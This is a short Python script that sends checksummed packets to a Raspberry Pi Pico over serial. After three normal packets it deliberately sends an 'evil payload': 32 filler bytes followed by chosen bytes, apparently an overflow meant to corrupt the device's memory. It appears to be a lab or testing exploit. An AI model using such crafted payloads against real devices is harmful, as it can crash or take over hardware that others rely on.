import serial
from time import time_ns

# craft evil payload packet
def send_deadly_block(s):
    data = []
    for i in range(32):
        data += [0xee]
    data += [0x6d, 0x03, 0x00, 0x10]
    send_block(s, bytearray(data))

# send a block of data to the pico
def send_block(s, data):
    length = len(data) + 4
    out = bytearray(length + 1)
    out[0] = 0x55 # synchronising byte
    out[1] = 0
    out[2] = 0 # next two bytes checksum
    out[3] = length & 0xff
    out[4] = (length >> 8) & 0xff # length of packet (not synchronisation byte)
    for i in range(5, length + 1):
        out[i] = data[i - 5] # data
    checksum = 0
    for i in range(1, len(out)):
        checksum = (checksum + out[i])
    checksum = (0x10000 - (checksum & 0xffff)) & 0xffff # calculate checksum
    out[1] = checksum & 0xff
    out[2] = (checksum >> 8) & 0xff
    s.write(out) # send packet

# wait for an acknowledgement or error (may get error due to timeout)
def await_response(s):
    buffer = bytes()
    now = (time_ns() // 1000000)
    while((time_ns() // 1000000) - now) < 500:
        if s.in_waiting > 0:
            buffer += s.read(s.in_waiting)
    text = buffer[:3].decode()
    print(f"Got: '{buffer.decode("utf-8", errors="replace")}'")
    s.reset_input_buffer() # clear our input buffer
    if text == "ACK":
        print("Successfully sent message")
        return
    else:
        print("Error sending message")
        return

def main():
    num = 0
    s = serial.Serial(port="/dev/ttyACM0", parity=serial.PARITY_EVEN, stopbits=serial.STOPBITS_ONE, timeout=1)
    s.flush()
    while True:
        data = input("> ")
        if num >= 3: # let first few packets be ok and then send error one
            print("Sending evil payload")
            send_deadly_block(s)
        else:
            send_block(s, bytearray(data, "utf8"))
        s.flush()
        await_response(s)
        num+=1

if __name__ == "__main__":
    main()
